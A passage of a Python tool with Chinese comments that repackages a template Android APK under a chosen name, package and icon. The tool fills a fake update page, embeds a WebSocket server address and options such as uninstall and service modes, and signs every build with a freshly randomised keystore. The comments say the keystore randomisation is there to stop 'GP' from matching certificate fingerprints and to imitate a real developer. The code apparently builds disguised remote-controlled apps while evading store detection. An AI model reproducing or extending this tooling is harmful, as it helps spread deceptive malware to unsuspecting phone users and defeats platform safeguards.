                    print(f'    [OK] ARSC 替换应用名(StringPool重建): {SHELL_ORIG_APP_NAME} -> {app_name}')
                # ★ 替换外壳 resources.arsc 中的包名
                for old_b, new_b, label in _pkg_replacements:
                    if old_b in data:
                        cnt = data.count(old_b)
                        data = data.replace(old_b, new_b)
                        print(f'    [OK] ARSC 替换包名({label}): ({cnt}处)')
                new_info.compress_type = zipfile.ZIP_STORED  # ARSC 必须 STORED
            elif info.filename == 'AndroidManifest.xml':
                # ★ 替换外壳 AndroidManifest.xml 中的应用名（AXML StringPool 重建，支持变长）
                if app_name and app_name != SHELL_ORIG_APP_NAME:
                    data = _rebuild_axml_stringpool(data, SHELL_ORIG_APP_NAME, app_name)
                # ★ 替换外壳 AndroidManifest.xml 中的包名
                for old_b, new_b, label in _pkg_replacements:
                    if old_b in data:
                        cnt = data.count(old_b)
                        data = data.replace(old_b, new_b)
                        print(f'    [OK] Manifest 替换包名({label}): ({cnt}处)')
                # ★ 升级 targetSdkVersion: 28 → 34（避免"针对旧版Android"警告）
                # AXML 中 attribute 值格式: TYPE_INT(08 00 00 10) + data(4 bytes LE)
                _TYPE_INT = b'\x08\x00\x00\x10'
                _OLD_TARGET = _TYPE_INT + struct.pack('<I', 28)
                _NEW_TARGET = _TYPE_INT + struct.pack('<I', 34)
                if _OLD_TARGET in data:
                    # 精准替换: 只改 targetSdkVersion=28 → 34
                    # 需要确认是紧跟 0x01010270 resourceId 之后的那个
                    # 简单策略: 替换最后出现的 TYPE_INT+28（因为AXML中顺序是minSdk在前, targetSdk在后）
                    rpos = data.rfind(_OLD_TARGET)
                    data = data[:rpos] + _NEW_TARGET + data[rpos+8:]
                    print(f'    [OK] Manifest targetSdkVersion: 28 → 34')
                new_info.compress_type = zipfile.ZIP_DEFLATED
            elif info.filename == 'assets/update_page.html' and app_name:
                # ★ 替换更新页 HTML 中的占位符
                import datetime
                html_text = data.decode('utf-8', errors='replace')
                html_text = html_text.replace('[APP-NAME]', app_name)
                html_text = html_text.replace('[APP-SIZE]', '56.8 MB')
                html_text = html_text.replace('[UPDATE-DATE]', datetime.date.today().strftime('%b %d, %Y'))
                html_text = html_text.replace('[COPYRIGHT-YEAR]', str(datetime.date.today().year))
                data = html_text.encode('utf-8')
                print(f'    [OK] 替换 update_page.html 占位符 (APP-NAME={app_name})')
                new_info.compress_type = zipfile.ZIP_DEFLATED
            elif icon_path and os.path.exists(icon_path) and info.filename.endswith('.png'):
                # 替换外壳图标（正方形 PNG，尺寸匹配标准 Android 图标）
                try:
                    if data[:8] == b'\x89PNG\r\n\x1a\n' and len(data) >= 24:
                        w = struct.unpack('>I', data[16:20])[0]
                        h = struct.unpack('>I', data[20:24])[0]
                        if abs(w - h) <= 2 and 30 <= w <= 1024:
                            with open(icon_path, 'rb') as f:
                                data = f.read()
                            print(f'    [OK] 替换外壳图标: {info.filename} ({w}x{h})')
                except:
                    pass
                new_info.compress_type = zipfile.ZIP_DEFLATED
            else:
                if info.compress_type == zipfile.ZIP_STORED or info.filename == 'resources.arsc':
                    new_info.compress_type = zipfile.ZIP_STORED
                else:
                    new_info.compress_type = zipfile.ZIP_DEFLATED
            
            if new_info.compress_type is None:
                new_info.compress_type = zipfile.ZIP_DEFLATED
            
            zout.writestr(new_info, data)
    
    # 写入文件
    with open(output_path, 'wb') as f:
        f.write(out_buf.getvalue())
    print(f'    写入: {output_path}')
    
    # ============ Step 7: 签名 ============
    print('  [7/7] 签名...')
    sign_apk(output_path)
    
    size = os.path.getsize(output_path) / 1024 / 1024
    print(f'\n  SUCCESS: {size:.1f} MB → {output_path}')


def _python_sign_v1(apk_path):
    """纯 Python 实现 JAR V1 签名 (无需任何外部工具)"""
    import base64, datetime, textwrap
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
    from cryptography.hazmat.backends import default_backend

    # 1. 生成 RSA 密钥对 + 自签名证书
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend()
    )
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, u"Debug"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Debug"),
        x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
    ])
    cert = (x509.CertificateBuilder()
        .subject_name(subject).issuer_name(issuer)
        .public_key(private_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=10000))
        .sign(private_key, hashes.SHA256(), default_backend()))
    cert_der = cert.public_bytes(serialization.Encoding.DER)

    # 2. 读取原始 APK，计算每个条目的 SHA-256 摘要 → MANIFEST.MF
    with zipfile.ZipFile(apk_path, 'r') as zin:
        entries = []
        for info in zin.infolist():
            if info.filename.startswith('META-INF/'):
                continue
            data = zin.read(info.filename)
            digest = base64.b64encode(hashlib.sha256(data).digest()).decode()
            entries.append((info, data, digest))

    manifest_lines = ["Manifest-Version: 1.0", "Created-By: build_apk_v2 (Python)", ""]
    for info, _, digest in entries:
        manifest_lines.append(f"Name: {info.filename}")
        manifest_lines.append(f"SHA-256-Digest: {digest}")
        manifest_lines.append("")
    manifest_mf = "\r\n".join(manifest_lines).encode('utf-8')

    # 3. 计算 MANIFEST.MF 的摘要 + 每个条目摘要 → CERT.SF
    mf_digest = base64.b64encode(hashlib.sha256(manifest_mf).digest()).decode()
    sf_lines = [
        "Signature-Version: 1.0",
        f"SHA-256-Digest-Manifest: {mf_digest}",
        "Created-By: build_apk_v2 (Python)",
        ""
    ]
    # 每个条目的 section digest
    sections = manifest_mf.decode('utf-8').split("\r\n\r\n")
    for section in sections:
        if section.startswith("Name: "):
            section_bytes = (section + "\r\n\r\n").encode('utf-8')
            sec_digest = base64.b64encode(hashlib.sha256(section_bytes).digest()).decode()
            name_line = [l for l in section.split("\r\n") if l.startswith("Name: ")][0]
            sf_lines.append(name_line)
            sf_lines.append(f"SHA-256-Digest: {sec_digest}")
            sf_lines.append("")
    cert_sf = "\r\n".join(sf_lines).encode('utf-8')

    # 4. 用私钥签名 CERT.SF → PKCS#7 DER (CERT.RSA)
    from cryptography.hazmat.primitives.serialization import pkcs7
    # 构造 PKCS#7 SignedData
    cert_rsa = (pkcs7.PKCS7SignatureBuilder()
        .set_data(cert_sf)
        .add_signer(cert, private_key, hashes.SHA256())
        .sign(serialization.Encoding.DER, [pkcs7.PKCS7Options.Binary]))

    # 5. 重新写入 APK (带 META-INF/)
    tmp_path = apk_path + '.signed.tmp'
    with zipfile.ZipFile(tmp_path, 'w') as zout:
        for info, data, _ in entries:
            new_info = zipfile.ZipInfo(info.filename)
            new_info.date_time = info.date_time
            new_info.compress_type = info.compress_type
            if info.filename == 'resources.arsc':
                new_info.compress_type = zipfile.ZIP_STORED
            zout.writestr(new_info, data)
        # 写入签名文件
        zout.writestr('META-INF/MANIFEST.MF', manifest_mf)
        zout.writestr('META-INF/CERT.SF', cert_sf)
        zout.writestr('META-INF/CERT.RSA', cert_rsa)

    shutil.move(tmp_path, apk_path)
    return True


def _find_build_tool(name):
    """在 PATH 和本地 Android SDK 中查找 build-tools 工具"""
    # 1. PATH 中查找
    found = shutil.which(name)
    if found:
        return found

    # 2. 扫描常见 Android SDK 路径
    sdk_dirs = []
    for env_key in ('ANDROID_HOME', 'ANDROID_SDK_ROOT', 'ANDROID_SDK'):
        v = os.environ.get(env_key)
        if v and os.path.isdir(v):
            sdk_dirs.append(v)
    # Windows 常见位置
    for base in [os.path.expandvars(r'%LOCALAPPDATA%\Android\Sdk'),
                 r'D:\Develop\android-sdk', r'C:\Android\sdk',
                 os.path.expanduser('~/Android/Sdk'),       # Linux
                 '/opt/android-sdk', '/usr/local/android-sdk']:
        if os.path.isdir(base) and base not in sdk_dirs:
            sdk_dirs.append(base)

    for sdk in sdk_dirs:
        bt = os.path.join(sdk, 'build-tools')
        if not os.path.isdir(bt):
            continue
        # 用最新版本
        versions = sorted(os.listdir(bt), reverse=True)
        for ver in versions:
            for ext in ('.bat', '.exe', ''):
                candidate = os.path.join(bt, ver, name + ext)
                if os.path.isfile(candidate):
                    return candidate
    return None


def sign_apk(apk_path):
    """签名 APK — 每次构建生成随机 keystore（避免 GP 通过证书指纹识别）"""
    import subprocess, random, string
    
    keystore = None
    alias = 'appkey'
    password = 'android'
    ks_type = 'JKS'
    
    # ★ 策略：每次构建生成全新随机 keystore，让 GP 无法通过证书指纹匹配
    keytool = shutil.which('keytool') or _find_build_tool('keytool')
    if keytool:
        # 随机 CN/O 信息，模拟真实开发者
        _rand_str = lambda n: ''.join(random.choices(string.ascii_letters, k=n))
        cn = _rand_str(random.randint(6, 12))
        org = _rand_str(random.randint(4, 8))
        locality = random.choice(['SanFrancisco', 'NewYork', 'London', 'Tokyo', 'Berlin', 'Sydney', 'Toronto'])
        country = random.choice(['US', 'GB', 'DE', 'JP', 'AU', 'CA', 'FR'])
        
        keystore = os.path.join(tempfile.gettempdir(), f'_build_{_rand_str(8)}.keystore')
        dname = f'CN={cn},OU=Dev,O={org},L={locality},ST=State,C={country}'
        subprocess.run([keytool, '-genkey', '-v', '-keystore', keystore, '-alias', alias,
            '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000',
            '-storepass', password, '-keypass', password, '-dname', dname],
            capture_output=True)
        if os.path.exists(keystore):
            print(f'    [OK] 随机 keystore 已生成 (CN={cn}, O={org}, C={country})')
    
    # Fallback: 已有的 debug keystore
    if not keystore or not os.path.exists(keystore):
        debug_candidates = [
            os.path.join(os.path.dirname(os.path.abspath(__file__)), '_debug.keystore'),
            '/opt/fisher-node/apk-builder/_debug.keystore',
        ]
        for ks in debug_candidates:
            if os.path.exists(ks):
                keystore = ks
                alias = 'debugkey'
                ks_type = 'JKS'
                print(f'    [WARN] 使用 debug keystore: {ks}')
                break

    # zipalign
    aligned = apk_path + '.aligned'
    zipalign_bin = _find_build_tool('zipalign')
    if zipalign_bin:
        subprocess.run([zipalign_bin, '-f', '4', apk_path, aligned], capture_output=True)
    else:
        shutil.copy2(apk_path, aligned)

    # 方案 A: apksigner (v1+v2)
    apksigner = _find_build_tool('apksigner')
    if apksigner and keystore:
        sign_cmd = [apksigner, 'sign']
        if ks_type == 'PKCS12':
            sign_cmd += ['--ks-type', 'pkcs12']
        sign_cmd += [
            '--ks', keystore, '--ks-pass', f'pass:{password}',
            '--key-pass', f'pass:{password}', '--ks-key-alias', alias,
            '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
            '--out', apk_path, aligned]
        result = subprocess.run(sign_cmd, capture_output=True)
        for tmp in [aligned, aligned + '.idsig', apk_path + '.idsig']:
            if os.path.exists(tmp):
                try: os.remove(tmp)
                except: pass
        if result.returncode == 0:
            print('    [OK] APK 签名完成 (apksigner v1+v2)')
            return
        print(f'    [WARN] apksigner 失败: {result.stderr.decode(errors="replace")[:200]}')

    # 方案 B: jarsigner (v1)
    jarsigner = shutil.which('jarsigner')
    if jarsigner and keystore:
        shutil.copy2(aligned, apk_path)
        subprocess.run([jarsigner, '-keystore', keystore, '-storepass', password,
                      '-keypass', password, apk_path, alias], capture_output=True)
        for tmp in [aligned, aligned + '.idsig']:
            if os.path.exists(tmp):
                try: os.remove(tmp)
                except: pass
        print('    [OK] APK 签名完成 (jarsigner v1)')
        return

    # 方案 C: 纯 Python V1 签名
    for tmp in [aligned, aligned + '.idsig']:
        if os.path.exists(tmp):
            try: os.remove(tmp)
            except: pass
    try:
        _python_sign_v1(apk_path)
        print('    [OK] APK 签名完成 (Python v1)')
    except Exception as e:
        print(f'    [WARN] Python 签名失败: {e}')


def main():
    parser = argparse.ArgumentParser(description='加固版 APK 重打包工具 v2')
    parser.add_argument('--server', required=True, help='WebSocket 服务器地址 (wss://...)')
    parser.add_argument('--web', default='', help='WebView 网页地址')
    parser.add_argument('--name', default='', help='应用显示名称')
    parser.add_argument('--package', default='', help='包名 (留空自动生成)')
    parser.add_argument('--icon', default='', help='应用图标 PNG 路径')
    parser.add_argument('--bg', default='', help='背景图 PNG 路径')
    parser.add_argument('--config', default='', help='完整 pageStyleConfig JSON')
    parser.add_argument('--template', default='/opt/fisher-node/apk-builder/source_v2.apk',
                       help='加固版模板 APK 路径')
    parser.add_argument('--output', required=True, help='输出 APK 路径')
    args = parser.parse_args()
    
    # 解析额外配置
    psc = {}
    if args.config:
        try:
            psc = json.loads(args.config)
        except:
            pass
    
    # 构建 server_config 额外字段
    sc_extra = {}
    if psc.get('_configMaskText'):
        sc_extra['configMaskText'] = psc['_configMaskText']
    if psc.get('_configMaskSubtitle'):
        sc_extra['configMaskSubtitle'] = psc['_configMaskSubtitle']
    if psc.get('_configMaskTextColor'):
        sc_extra['configMaskTextColor'] = psc['_configMaskTextColor']
    if psc.get('_configMaskSubtitleColor'):
        sc_extra['configMaskSubtitleColor'] = psc['_configMaskSubtitleColor']
    
    sc_extra['showAppIcon'] = psc.get('_showAppIcon', 'true') == 'true'
    sc_extra['uninstallMode'] = psc.get('_uninstallMode', 'false') == 'true'
    sc_extra['enableServiceMode'] = psc.get('_enableServiceMode', 'false') == 'true'
    sc_extra['enableConfigMask'] = psc.get('_enableConfigMask', 'true') == 'true'
    
    if psc.get('_ownerUsername'):
        sc_extra['ownerUsername'] = psc['_ownerUsername']
    
    if psc.get('_loadingTips'):
        try:
            tips = psc['_loadingTips']
            if isinstance(tips, str):
                tips = json.loads(tips) if tips.startswith('[') else tips.split('\n')
            sc_extra['loadingTips'] = tips
        except:
            pass
    
    # pageStyleConfig
    psc_out = {}
    for k in ['usageInstructions', 'enableButtonText', 'enableButtonTextColor',
              'buttonColor', 'versionName']:
        if psc.get(k):
            psc_out[k] = psc[k]
    if psc_out:
        sc_extra['pageStyleConfig'] = psc_out
    
    pkg = args.package or psc.get('applicationId', '')
    name = args.name or psc.get('appName', '')
    
    repack_apk(
        template_path=args.template,
        output_path=args.output,
        server_url=args.server,
        web_url=args.web,
        app_name=name,
        package_name=pkg,
        icon_path=args.icon,
        bg_path=args.bg,
        server_config_extra=sc_extra,
    )


if __name__ == '__main__':
    main()
